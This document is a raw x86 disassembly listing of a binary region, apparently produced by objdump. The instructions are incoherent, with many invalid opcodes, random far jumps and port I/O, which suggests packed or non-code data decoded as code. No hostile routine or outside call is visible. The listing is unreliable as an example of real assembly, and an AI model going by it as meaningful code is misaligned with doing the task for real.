  42dbfe:	lods   al,BYTE PTR ds:[esi]
  42dbff:	outs   dx,DWORD PTR ds:[esi]
  42dc00:	mov    dl,0x35
  42dc02:	rol    bh,0xe5
  42dc05:	sahf   
  42dc06:	int3   
  42dc07:	sbb    cl,BYTE PTR [eax+ecx*8]
  42dc0a:	dec    ecx
  42dc0b:	dec    ecx
  42dc0c:	ja     0x42dc4b
  42dc0e:	ss xchg esp,eax
  42dc10:	mov    esp,0x5e90fe33
  42dc15:	mov    dl,0x9a
  42dc17:	jp     0x42dc01
  42dc19:	mov    al,0xc2
  42dc1b:	arpl   WORD PTR [edi+0x9],sp
  42dc1e:	push   ss
  42dc1f:	cs jmp 0x42dc09
  42dc22:	push   eax
  42dc23:	add    ch,BYTE PTR es:[esi]
  42dc26:	pop    esi
  42dc27:	test   esi,0x88438a17
  42dc2d:	cmp    esi,DWORD PTR [edi]
  42dc2f:	sbb    al,0xcd
  42dc31:	leave  
  42dc32:	fisub  DWORD PTR [ebp+0x64]
  42dc35:	cmp    eax,0x4998de03
  42dc3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc3b:	dec    ebx
  42dc3c:	xchg   edx,eax
  42dc3d:	pop    es
  42dc3e:	pusha  
  42dc3f:	enter  0x80ce,0x35
  42dc43:	adc    al,0xc5
  42dc45:	stos   BYTE PTR es:[edi],al
  42dc46:	jecxz  0x42dc4d
  42dc48:	adc    ah,BYTE PTR [edi+0x44]
  42dc4b:	jnp    0x42dc5e
  42dc4d:	xor    dl,BYTE PTR [edi-0x7a]
  42dc50:	sbb    bh,al
  42dc52:	xor    eax,0xcf7a3771
  42dc57:	frstor [ebx+0x213c8b5a]
  42dc5d:	in     eax,0x61
  42dc5f:	loope  0x42dc24
  42dc61:	test   eax,0x2fa00dd2
  42dc66:	push   0xffffff9c
  42dc68:	test   DWORD PTR [edx+edi*8],edi
  42dc6b:	push   ebx
  42dc6c:	cmp    ah,dl
  42dc6e:	cwde   
  42dc6f:	shr    BYTE PTR [eax],0xa0
  42dc72:	mov    edx,0x9f5fa501
  42dc77:	xchg   ebp,eax
  42dc78:	xchg   edi,eax
  42dc79:	js     0x42dc85
  42dc7b:	pop    eax
  42dc7c:	xor    bh,BYTE PTR [ebx+0x1ee09c3d]
  42dc82:	adc    ch,al
  42dc84:	mov    ds:0x69e25eab,al
  42dc89:	iret   
  42dc8a:	push   esp
  42dc8b:	sbb    BYTE PTR [esi-0x6f],bh
  42dc8e:	popa   
  42dc8f:	pusha  
	...
  42dcf4:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	xor    BYTE PTR [eax-0x63],bl
  42dd03:	les    ebp,FWORD PTR [edx+ebp*8]
  42dd06:	add    DWORD PTR [eax],eax
  42dd08:	add    al,0x1
  42dd0a:	add    BYTE PTR [eax],al
  42dd0c:	mov    bh,0xd0
  42dd0e:	test   BYTE PTR [ebp-0x23],dh
  42dd11:	push   ecx
  42dd12:	push   ebx
  42dd13:	push   cs
  42dd14:	add    ah,dl
  42dd16:	push   ebp
  42dd17:	jge    0x42dccd
  42dd19:	shl    BYTE PTR ds:0xeff30633,0x92
  42dd20:	cmp    eax,0x841aebed
  42dd25:	dec    ecx
  42dd26:	xor    DWORD PTR [edi+eax*2-0x5a2757eb],0xf2da9895
  42dd31:	mov    bl,0xe6
  42dd33:	and    al,0xec
  42dd35:	dec    eax
  42dd36:	jmp    0x42dd73
  42dd38:	xor    edi,DWORD PTR [edi-0x3bcb5cf5]
  42dd3e:	jle    0x42dcd5
  42dd40:	pop    edx
  42dd41:	jne    0x42dd41
  42dd43:	mov    ch,0xfe
  42dd45:	inc    ebx
  42dd46:	mov    eax,0x6a764af5
  42dd4b:	and    edx,DWORD PTR [ebp-0x72]
  42dd4e:	out    dx,al
  42dd4f:	jne    0x42dd0f
  42dd51:	push   esi
  42dd52:	push   es
  42dd53:	arpl   bx,bx
  42dd55:	inc    ecx
  42dd56:	xchg   esi,eax
  42dd57:	in     eax,0x2b
  42dd59:	aam    0x9f
  42dd5b:	test   BYTE PTR [edx-0x615866b6],cl
  42dd61:	mov    ds:0x4460fec1,eax
  42dd66:	pop    ebp
  42dd67:	sub    cl,dh
  42dd69:	fdivr  DWORD PTR [ebp+ebx*1+0x20]
  42dd6d:	popf   
  42dd6e:	dec    ecx
  42dd6f:	or     al,bl
  42dd71:	pop    edi
  42dd72:	(bad)  
  42dd73:	mov    edx,0xc9b5c3a7
  42dd78:	or     BYTE PTR [edx+0x78],0x54
  42dd7c:	pop    ebx
  42dd7d:	(bad)  
  42dd7e:	lock sbb bl,cl
  42dd81:	pop    esp
  42dd82:	jbe    0x42dd95
  42dd84:	mov    ah,0x16
  42dd86:	leave  
  42dd87:	call   DWORD PTR [eax-0x56043902]
  42dd8d:	ret    0xcd6d
  42dd90:	xchg   ebx,eax
  42dd91:	jmp    0x42dda8
  42dd93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd94:	xor    DWORD PTR [ecx-0x4f],esp
  42dd97:	loope  0x42dd99
  42dd99:	sbb    al,0x69
  42dd9b:	jmp    0x3873:0x2ce01a3b
  42dda2:	cmp    DWORD PTR [eax-0x31c43016],esi
  42dda8:	out    0xdc,eax
  42ddaa:	add    edi,DWORD PTR [edx]
  42ddac:	pop    ecx
  42ddad:	xchg   esp,ebp
  42ddaf:	rcr    DWORD PTR [ebx],cl
  42ddb1:	xchg   edi,eax
  42ddb2:	cli    
  42ddb3:	lds    esi,FWORD PTR [edx-0x60]
  42ddb6:	jmp    0x75e7:0x8223a43e
  42ddbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ddbe:	gs sub eax,0x52080929
  42ddc4:	scas   eax,DWORD PTR es:[edi]
  42ddc5:	dec    eax
  42ddc6:	push   edx
  42ddc7:	aad    0x4a
  42ddc9:	pop    esi
  42ddca:	fist   DWORD PTR [esi]
  42ddcc:	mov    WORD PTR [ebx],?
  42ddce:	xor    DWORD PTR [esi-0x6b],ecx
  42ddd1:	rol    DWORD PTR [ebx-0x345ec000],0x46
  42ddd8:	cdq    
  42ddd9:	pop    esi
  42ddda:	pop    edi
  42dddb:	lahf   
  42dddc:	jns    0x42ddc5
  42ddde:	mov    dl,0x5f
  42dde0:	mov    eax,0xc99702c9
  42dde5:	mov    ah,0x92
  42dde7:	cmp    eax,0xfabe3f85
  42ddec:	cs jg  0x42dde8
  42ddef:	pop    eax
  42ddf0:	bound  esp,QWORD PTR [eax]
  42ddf2:	cwde   
  42ddf3:	stc    
  42ddf4:	and    al,0x3b
  42ddf6:	sub    al,0xcd
  42ddf8:	cmp    bl,BYTE PTR [edx+0x174f5728]
  42ddfe:	mov    eax,DWORD PTR [ecx-0x5d537b74]
  42de04:	mov    ebp,0xeb28c112
  42de09:	pop    esp
  42de0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42de0b:	inc    ebp
  42de0c:	loop   0x42ddd9
  42de0e:	data16 cli 
	...
  42de74:	out    0x82,al
  42de76:	lods   eax,DWORD PTR ds:[esi]
  42de77:	xor    ebp,ebp
  42de79:	aas    
  42de7a:	(bad)  
  42de7b:	xlat   BYTE PTR ds:[ebx]
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	xchg   ebp,eax
  42de81:	sub    DWORD PTR [ebx-0x32],esi
  42de84:	xor    bl,ch
  42de86:	add    DWORD PTR [eax],eax
  42de88:	add    al,0x1
  42de8a:	add    BYTE PTR [eax],al
  42de8c:	jbe    0x42de9d
  42de8e:	and    bl,BYTE PTR ds:0x8fa3fe85
  42de94:	popa   
  42de95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42de96:	sti    
  42de97:	jmp    0xa00b:0xb8b1122c
  42de9e:	and    eax,DWORD PTR [esi+0x74929d7f]
  42dea4:	cmp    al,0xb2
  42dea6:	inc    esp
  42dea7:	push   ebx
  42dea8:	dec    ebp
  42dea9:	(bad)  
  42deaa:	lahf   
  42deab:	in     al,0x5
  42dead:	pop    es
  42deae:	jp     0x42de63
  42deb0:	cdq    
  42deb1:	pop    edx
  42deb2:	lock inc edi
  42deb4:	push   ss
  42deb5:	cmp    al,0xe8
  42deb7:	push   esi
  42deb8:	shl    BYTE PTR [eax+eax*1],0x7e
  42debc:	out    dx,al
  42debd:	cmp    eax,0x61ebd93d
  42dec2:	rcl    eax,cl
  42dec4:	dec    eax
  42dec5:	inc    edx
  42dec6:	test   al,0x92
  42dec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dec9:	dec    edi
  42deca:	sbb    DWORD PTR [eax-0x47a2025a],ebx
  42ded0:	pop    edx
  42ded1:	push   eax
  42ded2:	sti    
  42ded3:	cmp    esp,DWORD PTR [esi-0x49b05228]
  42ded9:	ret    
  42deda:	rol    BYTE PTR [ecx-0x3b19458b],0xf8
  42dee1:	cmp    ebx,DWORD PTR [edx+0x42ed6f53]
  42dee7:	ins    BYTE PTR es:[edi],dx
  42dee8:	jmp    0x3026a617
  42deed:	inc    ebx
  42deee:	scas   eax,DWORD PTR es:[edi]
  42deef:	cdq    
  42def0:	inc    esi
  42def1:	or     BYTE PTR [ebp-0x61d3b39d],al
  42def7:	pushf  
  42def8:	inc    eax
  42def9:	adc    eax,0xe247e171
  42defe:	push   esp
  42deff:	jecxz  0x42df30
  42df01:	pop    ecx
  42df02:	sar    esi,0x3d
  42df05:	push   esp
  42df06:	test   eax,0x61613a17
  42df0b:	adc    DWORD PTR [edi-0x44],esi
  42df0e:	jnp    0x42dedc
  42df10:	pop    esp
  42df11:	push   ebp
  42df12:	cmc    
  42df13:	inc    ecx
  42df14:	lahf   
  42df15:	mov    ebp,0x5900409c
  42df1a:	adc    ch,ch
  42df1c:	sti    
  42df1d:	or     BYTE PTR [ebp+0x22],bl
  42df20:	xchg   ecx,eax
  42df21:	mov    ds:0xdd194362,eax
  42df26:	mov    ds,esi
  42df28:	in     al,dx
  42df29:	adc    ah,dh
  42df2b:	mov    fs,WORD PTR cs:[eax-0x15]
  42df2f:	(bad)  
  42df30:	scas   eax,DWORD PTR es:[edi]
  42df31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df32:	inc    eax
  42df33:	push   ss
  42df34:	cmp    ecx,DWORD PTR [edi]
  42df36:	ret    0xcc11
  42df39:	jmp    0x42df11
  42df3b:	add    DWORD PTR [edi],edi
  42df3d:	repnz pop esi
  42df3f:	xor    eax,0xb8b38200
  42df44:	dec    edi
  42df45:	icebp  
  42df46:	mov    ah,ch
  42df48:	jne    0x42dee9
  42df4a:	(bad)  
  42df4b:	push   ds
  42df4c:	mov    esp,0xbe9eb7f2
  42df51:	jle    0x42df84
  42df53:	shl    BYTE PTR [edi+0x5],0xc
  42df57:	mov    al,ds:0x3cc17252
  42df5c:	or     DWORD PTR [esp+eax*1+0x17f70d86],ebx
  42df63:	add    edi,DWORD PTR [edi]
  42df65:	fwait
  42df66:	loope  0x42df48
  42df68:	(bad)  
  42df69:	mov    esi,0x8a1cb7b8
  42df6e:	mov    edi,0xe5630538
  42df73:	outs   dx,BYTE PTR ds:[esi]
  42df74:	test   DWORD PTR [eax],esp
  42df76:	sub    ecx,ebx
  42df78:	jmp    0x42defb
  42df7a:	out    dx,al
  42df7b:	push   ebx
  42df7c:	dec    edi
  42df7d:	out    dx,al
  42df7e:	movaps xmm7,XMMWORD PTR [esp+esi*2]
  42df82:	in     al,dx
  42df83:	sub    cl,BYTE PTR [ebx+0x56]
  42df86:	leave  
  42df87:	cmp    esi,DWORD PTR [ebp-0x69405771]
  42df8d:	adc    DWORD PTR [eax+edi*8+0x0],esi
	...
  42dff4:	add    bh,dh
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi-0x23]
  42e001:	loop   0x42e002
  42e003:	or     eax,0x1ec34
  42e008:	add    al,0x1
  42e00a:	add    BYTE PTR [eax],al
  42e00c:	mov    ebp,0xfb556785
  42e011:	xchg   edx,eax
  42e012:	inc    esp
  42e013:	test   eax,0x55bf880c
  42e018:	jge    0x42e08d
  42e01a:	push   esp
  42e01b:	adc    BYTE PTR [edx-0xa],bl
  42e01e:	loop   0x42e09d
  42e020:	cdq    
  42e021:	lea    ebx,[ebx-0x4b]
  42e024:	lods   eax,DWORD PTR ds:[esi]
  42e025:	test   BYTE PTR [esi],ah
  42e027:	das    
  42e028:	xchg   dl,bh
  42e02a:	in     eax,dx
  42e02b:	scas   al,BYTE PTR es:[edi]
  42e02c:	pop    es
  42e02d:	mov    ch,0x46
  42e02f:	inc    edi
  42e030:	(bad)  
  42e031:	icebp  
  42e032:	cmp    ebx,esi
  42e034:	fidivr WORD PTR [eax+0x71856712]
  42e03a:	mov    cl,0x69
  42e03c:	adc    al,BYTE PTR [edx]
  42e03e:	mov    al,ds:0xb67dc3da
  42e043:	loopne 0x42e033
  42e045:	ss jp  0x42dfcf
  42e048:	push   eax
  42e049:	mov    ds:0xb9c51ff3,al
  42e04e:	mov    ?,WORD PTR [ecx+0x42dd8bc4]
  42e054:	push   edi
  42e055:	mov    BYTE PTR [ecx-0x5d],ah
  42e058:	imul   ebx,DWORD PTR [ebx],0x40169949
  42e05e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e05f:	sub    eax,0x3fe09d54
  42e064:	std    
  42e065:	pop    ebx
  42e066:	inc    ebp
  42e067:	fild   QWORD PTR [ecx-0x48a25c30]
  42e06d:	psubsw mm3,QWORD PTR [esi+edx*2-0x1419e2fb]
  42e075:	je     0x42e017
  42e077:	sub    eax,0xe0fddd4f
  42e07c:	out    0x65,al
  42e07e:	add    eax,0x50ad541
  42e083:	sbb    ebx,ecx
  42e085:	pop    esi
  42e086:	jge    0x42e041
  42e088:	ins    BYTE PTR es:[edi],dx
  42e089:	out    0x82,eax
  42e08b:	test   ah,dl
  42e08d:	test   eax,0x2745a5a
  42e092:	mov    ch,0xff
  42e094:	cmp    al,BYTE PTR [eax+0x4a4c755a]
  42e09a:	out    dx,al
  42e09b:	into   
  42e09c:	sub    BYTE PTR ds:0xaca70c38,ah
  42e0a2:	cmp    bh,BYTE PTR [edx]
  42e0a4:	adc    BYTE PTR [eax],ah
  42e0a6:	lods   eax,DWORD PTR ds:[esi]
  42e0a7:	sub    bh,dl
  42e0a9:	loopne 0x42e0ee
  42e0ab:	ins    DWORD PTR es:[edi],dx
  42e0ac:	or     DWORD PTR [ecx],edx
  42e0ae:	fiadd  DWORD PTR [esi+0x6e]
  42e0b1:	add    BYTE PTR [edx],al
  42e0b3:	push   edi
  42e0b4:	loope  0x42e0c6
  42e0b6:	sub    eax,0x205eae17
  42e0bb:	pop    ebx
  42e0bc:	push   0x1c
  42e0be:	fnstenv ds:0xa923cc11
  42e0c4:	jns    0x42e0c3
  42e0c6:	jge    0x42e127
  42e0c8:	inc    edx
  42e0c9:	pop    esi
  42e0ca:	cs jmp 0xc607ebc8
  42e0d0:	(bad)  
  42e0d1:	fidivr DWORD PTR [edx-0x11]
  42e0d4:	int    0x65
  42e0d6:	test   al,0x3e
  42e0d8:	xchg   edx,eax
  42e0d9:	ss jg  0x42e0a8
  42e0dc:	into   
  42e0dd:	jmp    ebp
  42e0df:	and    DWORD PTR [ecx-0x41],ecx
  42e0e2:	aad    0xdb
  42e0e4:	pop    esi
  42e0e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e0e7:	jecxz  0x42e111
  42e0e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e0ea:	mov    bh,0x71
  42e0ec:	mov    bl,0xed
  42e0ee:	jno    0x42e0f1
  42e0f0:	aas    
  42e0f1:	pop    ss
  42e0f2:	inc    edx
  42e0f3:	stos   BYTE PTR es:[edi],al
  42e0f4:	xlat   BYTE PTR ds:[ebx]
  42e0f5:	xor    BYTE PTR [eax+0x6b],bh
  42e0f8:	test   edx,edi
  42e0fa:	gs mov edi,0x7795a39e
  42e100:	mov    BYTE PTR [esi+0x43],bl
  42e103:	js     0x42e0ff
  42e105:	test   BYTE PTR [edi+0x5f],dl
  42e108:	sbb    ch,al
  42e10a:	or     esp,DWORD PTR ds:0x4a143846
	...
  42e174:	mov    eax,ds:0x7e061ecf
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	cmp    BYTE PTR [ecx],ah
  42e182:	(bad)  
  42e183:	repz cmp ch,ch
  42e186:	add    DWORD PTR [eax],eax
  42e188:	add    al,0x1
  42e18a:	add    BYTE PTR [eax],al
  42e18c:	and    ch,dh
  42e18e:	js     0x42e1e9
  42e190:	call   0xfc60:0x282d6d82
  42e197:	mov    ebx,0xaf854e74
  42e19c:	inc    ebx
  42e19d:	cli    
  42e19e:	xchg   edi,eax
  42e19f:	imul   ebp,DWORD PTR [edx-0xa586ff8],0x2ebd1f14
  42e1a9:	mov    edi,ebp
  42e1ab:	stc    
  42e1ac:	sahf   
  42e1ad:	fnstcw WORD PTR [esi*4-0x33fa4349]
  42e1b4:	out    0x63,al
  42e1b6:	inc    ebx
  42e1b7:	add    DWORD PTR [edi],0xffffffa8
  42e1ba:	loop   0x42e1cd
  42e1bc:	ror    DWORD PTR [esi+0x627e746a],cl
  42e1c2:	ja     0x42e15d
  42e1c4:	int3   
  42e1c5:	cld    
  42e1c6:	lods   al,BYTE PTR ds:[esi]
  42e1c7:	mov    dh,0x4b
  42e1c9:	mov    ebx,0x645e10f1
  42e1ce:	test   al,0x41
  42e1d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e1d1:	retf   
  42e1d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e1d3:	inc    edi
  42e1d4:	jno    0x42e174
  42e1d6:	push   edi
  42e1d7:	(bad)  
  42e1d8:	mov    ebp,0xcdc56a53
  42e1dd:	pop    ss
  42e1de:	xchg   esi,eax
  42e1df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e1e0:	rcr    BYTE PTR [eax+0x32],cl
  42e1e3:	aam    0x4e
  42e1e5:	lods   eax,DWORD PTR ds:[esi]
  42e1e6:	jae    0x42e17d
  42e1e8:	ins    BYTE PTR es:[edi],dx
  42e1e9:	jmp    0xefa50cc8
  42e1ee:	pusha  
  42e1ef:	ins    BYTE PTR es:[edi],dx
  42e1f0:	xor    eax,0x3ee510af
  42e1f5:	imul   ebx,DWORD PTR [ebp+ebx*2-0x31],0xfffffff7
  42e1fa:	enter  0x354e,0x8b
  42e1fe:	(bad)  
  42e1ff:	stc    
  42e200:	into   
  42e201:	jmp    0x46714a57
  42e206:	xchg   ecx,eax
  42e207:	lods   al,BYTE PTR ds:[esi]
  42e208:	pushf  
  42e209:	mov    cl,0xdf
  42e20b:	aad    0x1a
  42e20d:	xor    dl,ch
  42e20f:	xchg   DWORD PTR [ebx+0x21],esp
  42e212:	shl    DWORD PTR [esp+ebp*1],0x86
  42e216:	mov    cl,0x66
  42e218:	fiadd  DWORD PTR [edi]
  42e21a:	mov    dh,0x90
  42e21c:	pop    esi
  42e21d:	inc    ebp
  42e21e:	xor    al,0x65
  42e220:	inc    esp
  42e221:	sbb    BYTE PTR [edx],ch
  42e223:	nop
  42e224:	adc    bh,BYTE PTR [ecx+0x7e]
  42e227:	pop    es
  42e228:	add    BYTE PTR [eax+0xf04b1f],bl
  42e22e:	out    dx,eax
  42e22f:	ins    BYTE PTR es:[edi],dx
  42e230:	mov    ds:0x7791c6e5,eax
  42e235:	lods   al,BYTE PTR ds:[esi]
  42e236:	arpl   WORD PTR [ecx-0x51],cx
  42e239:	sub    dh,BYTE PTR [edi]
  42e23b:	repnz gs pop esp
  42e23e:	adc    eax,0xbdd3552e
  42e243:	jecxz  0x42e22b
  42e245:	js     0x42e1ce
  42e247:	mov    dh,ch
  42e249:	mov    bh,0xf5
  42e24b:	jp     0x42e1d2
  42e24d:	shl    DWORD PTR ds:0xb3289578,cl
  42e253:	gs sbb eax,0x584e7827
  42e259:	out    0x8d,al
  42e25b:	jle    0x42e2b5
  42e25d:	hlt    
  42e25e:	in     al,dx
  42e25f:	aaa    
  42e260:	add    BYTE PTR [eax+eiz*1],bl
  42e263:	cli    
  42e264:	sbb    ch,BYTE PTR [ebx+edx*1]
  42e267:	pop    ds
  42e268:	cmc    
  42e269:	mov    eax,0xf2e73537
  42e26e:	popf   
  42e26f:	mov    DWORD PTR ds:0xff965b50,ecx
  42e275:	add    DWORD PTR [esi],eax
  42e277:	push   esi
  42e278:	adc    eax,0xdcc0d214
  42e27d:	mov    ah,0x4b
  42e27f:	std    
  42e280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e281:	cmp    cl,BYTE PTR [ecx-0x14]
  42e284:	xor    DWORD PTR ds:[eax-0x22c4e8c9],edx
  42e28b:	out    0x42,al
  42e28d:	jle    0x42e304
  42e28f:	push   edi
	...
  42e2f4:	lods   eax,DWORD PTR ds:[esi]
  42e2f5:	cmp    eax,0xb79aa78a
  42e2fa:	lods   eax,DWORD PTR ds:[esi]
  42e2fb:	aas    
  42e2fc:	mov    ebx,0x5c199140
  42e301:	jno    0x42e354
  42e303:	pusha  
  42e304:	cmp    al,0xee
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    al,0x1
  42e30a:	add    BYTE PTR [eax],al
  42e30c:	mov    dl,0x25
  42e30e:	inc    edx
  42e30f:	fwait
  42e310:	mov    BYTE PTR [edi-0x4d3d73b7],dl
  42e316:	ss mov eax,0xacc14f4
  42e31c:	cdq    
  42e31d:	cli    
  42e31e:	adc    eax,0x54716971
  42e323:	sub    ah,BYTE PTR [edi+0x2a34c089]
  42e329:	outs   dx,DWORD PTR ds:[esi]
  42e32a:	add    al,0x10
  42e32c:	adc    DWORD PTR [edi-0x1e],edi
  42e32f:	mov    ebp,0xe629f16b
  42e334:	mov    ah,0xe9
  42e336:	sbb    ch,dh
  42e338:	sahf   
  42e339:	dec    eax
  42e33a:	xchg   ebx,eax
  42e33b:	(bad)  
  42e33c:	(bad)  
  42e33d:	jo     0x42e2d9
  42e33f:	sar    DWORD PTR [esi],1
  42e341:	cmp    bl,al
  42e343:	pop    esi
  42e344:	mov    eax,0x9c027dff
  42e349:	or     bh,0xb5
  42e34c:	aad    0xa9
  42e34e:	stos   BYTE PTR es:[edi],al
  42e34f:	jg     0x42e33c
  42e351:	fnstcw WORD PTR [eax]
  42e353:	dec    esi
  42e354:	repz shl DWORD PTR [edx],1
  42e357:	mov    cl,0xf9
  42e359:	lahf   
  42e35a:	lds    ecx,FWORD PTR [eax-0x4a]
  42e35d:	pushf  
  42e35e:	mov    edx,0xa0efaac
  42e363:	loopne 0x42e3c0
  42e365:	rcr    BYTE PTR [edi+0x52],cl
  42e368:	jge    0x42e343
  42e36a:	xchg   ebx,eax
  42e36b:	dec    ebx
  42e36c:	mov    ecx,0x6c0d59fe
  42e371:	sbb    al,0xdf
  42e373:	push   DWORD PTR [esi+0x33]
  42e376:	shl    BYTE PTR [esi+ebp*1+0x48],0x65
  42e37b:	push   es
  42e37c:	add    al,0xff
  42e37e:	or     al,0x7c
  42e380:	ja     0x42e355
  42e382:	std    
  42e383:	retf   
  42e384:	jbe    0x42e384
  42e386:	rcl    BYTE PTR [edi-0x46],1
  42e389:	push   0xa82314b1
  42e38e:	popf   
  42e38f:	retf   
  42e390:	xlat   BYTE PTR ds:[ebx]
  42e391:	shl    DWORD PTR [ebx+0x4f43dfea],cl
  42e397:	jecxz  0x42e358
  42e399:	pop    ds
  42e39a:	outs   dx,BYTE PTR ds:[esi]
  42e39b:	neg    DWORD PTR [eax-0x74]
  42e39e:	mov    ebx,0xf0ae32fe
  42e3a3:	mov    dh,0xd0
  42e3a5:	and    eax,0xe2af7f3f
  42e3aa:	sbb    eax,0xf63b0d81
  42e3af:	xchg   ebp,eax
  42e3b0:	mov    dh,0xca
  42e3b2:	test   eax,ebp
  42e3b4:	lea    eax,es:[ecx+0x163541dd]
  42e3bb:	rol    ebp,cl
  42e3bd:	sub    dh,BYTE PTR [ecx]
  42e3bf:	inc    esi
  42e3c0:	scas   al,BYTE PTR es:[edi]
  42e3c1:	mov    BYTE PTR [edx+0x2d8c8f94],cl
  42e3c7:	jb     0x42e403
  42e3c9:	pop    DWORD PTR [edi+0x35]
  42e3cc:	or     al,0xb
  42e3ce:	dec    esi
  42e3cf:	push   ebx
  42e3d0:	dec    edi
  42e3d1:	lea    eax,[eax+0x35]
  42e3d4:	cmp    al,0x1f
  42e3d6:	in     al,0x40
  42e3d8:	sar    esi,cl
  42e3da:	cwde   
  42e3db:	inc    edx
  42e3dc:	push   es
  42e3dd:	sub    eax,DWORD PTR [eax]
  42e3df:	imul   ebp,DWORD PTR [esi+0x349ea166]
  42e3e6:	jo     0x42e3d1
  42e3e8:	jno    0x42e3c2
  42e3ea:	jae    0x42e399
  42e3ec:	das    
  42e3ed:	push   edx
  42e3ee:	cs jp  0x42e46f
  42e3f1:	call   DWORD PTR [edi+0x66cd41da]
  42e3f7:	popa   
  42e3f8:	test   esi,edi
  42e3fa:	int3   
  42e3fb:	retf   0x937
  42e3fe:	iret   
  42e3ff:	cmp    ch,BYTE PTR [ecx+esi*2-0x6e]
  42e403:	and    eax,0xc0abc234
  42e408:	imul   eax,DWORD PTR ds:0x4e9bdb40,0xffffffcb
  42e40f:	test   BYTE PTR [eax],al
	...
  42e471:	add    BYTE PTR [eax],al
  42e473:	add    dl,ah
  42e475:	mov    ebp,0xe7dfc7dc
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	dec    eax
  42e481:	mov    cl,0xdd
  42e483:	jmp    0x104:0x1ef40
  42e48a:	add    BYTE PTR [eax],al
  42e48c:	adc    BYTE PTR ds:0x987df280,bl
  42e492:	xchg   esi,eax
  42e493:	mov    al,ds:0xa2a5e0f2
  42e498:	mov    edx,0xd295000
  42e49d:	mov    cl,0xab
  42e49f:	sub    ah,0x51
  42e4a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e4a3:	es retf 
  42e4a5:	test   al,0x66
  42e4a7:	loop   0x42e4b1
  42e4a9:	add    ebp,DWORD PTR [ecx+0x3e]
  42e4ac:	daa    
  42e4ad:	xchg   esi,eax
  42e4ae:	ret    0x977b
  42e4b1:	or     eax,0x74c089a1
  42e4b6:	mov    edx,0x914e1ec8
  42e4bb:	bound  edi,QWORD PTR [edi-0x2d]
  42e4be:	sbb    edi,ecx
  42e4c0:	or     ebp,DWORD PTR [edi-0x7d]
  42e4c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e4c4:	rcl    BYTE PTR [edi-0x7a127d79],1
  42e4ca:	mov    ds:0x165d857d,al
  42e4cf:	jg     0x42e498
  42e4d1:	ss push edx
  42e4d3:	aaa    
  42e4d4:	data16 arpl WORD PTR [ebx-0x2760ce33],ax
  42e4db:	inc    ebx
  42e4dc:	fs mov ebx,esp
  42e4df:	jp     0x42e4ff
  42e4e1:	bound  edx,QWORD PTR [edx-0x7b5e403e]
  42e4e7:	push   esp
  42e4e8:	pop    ebp
  42e4e9:	pop    ss
  42e4ea:	into   
  42e4eb:	sbb    al,0x1b
  42e4ed:	cmp    eax,0xc04e0eb
  42e4f2:	dec    edx
  42e4f3:	sbb    al,0x33
  42e4f5:	jmp    0x869f:0xf55cda05
  42e4fc:	or     DWORD PTR [edx],edi
  42e4fe:	aad    0x8c
  42e500:	sub    al,0xa1
  42e502:	jb     0x42e545
  42e504:	sbb    BYTE PTR [esp+ebx*2],al
  42e507:	mov    bl,0xc6
  42e509:	retf   
  42e50a:	pop    edx
  42e50b:	add    eax,0x91c8c64f
  42e510:	xchg   esi,eax
  42e511:	push   ebp
  42e512:	bound  edi,QWORD PTR [ebx]
  42e514:	(bad)  
  42e515:	in     eax,0xbf
  42e517:	dec    ebp
  42e518:	(bad)  
  42e519:	mov    edi,0xb33f0acb
  42e51e:	out    dx,eax
  42e51f:	inc    esp
  42e520:	or     eax,0xab693454
  42e525:	shl    BYTE PTR [edx-0x6b07794a],cl
  42e52b:	ins    DWORD PTR es:[edi],dx
  42e52c:	repz jl 0x42e511
  42e52f:	cmp    eax,0x8060f9af
  42e534:	in     eax,0x4a
  42e536:	mov    ds:0x41823f5f,eax
  42e53b:	adc    DWORD PTR [edx-0x419483e6],eax
  42e541:	xchg   DWORD PTR [edi-0x7c11a22c],esp
  42e547:	loop   0x42e51c
  42e549:	or     cl,BYTE PTR [ecx-0x3a17a537]
  42e54f:	cmp    ax,0x2efb
  42e553:	ficomp WORD PTR [edi+0x1]
  42e556:	sbb    bl,BYTE PTR [ebp+0x30]
  42e559:	cmp    BYTE PTR [eax],dh
  42e55b:	mov    esp,0xa8161b68
  42e560:	ins    DWORD PTR es:[edi],dx
  42e561:	std    
  42e562:	mov    edi,0x6bc1f16a
  42e567:	add    DWORD PTR ds:0x6adee3bf,esp
  42e56d:	jge    0x42e578
  42e56f:	js     0x42e544
  42e571:	shr    esp,cl
  42e573:	aas    
  42e574:	jno    0x42e52d
  42e576:	cdq    
  42e577:	mov    bl,BYTE PTR [edx]
  42e579:	jecxz  0x42e53e
  42e57b:	dec    ecx
  42e57c:	cmp    edx,DWORD PTR [esi-0xd]
  42e57f:	or     ecx,0x657fd43d
  42e585:	scas   al,BYTE PTR es:[edi]
  42e586:	pop    esp
  42e587:	mov    al,0xa1
  42e589:	test   eax,0xc4a82ff4
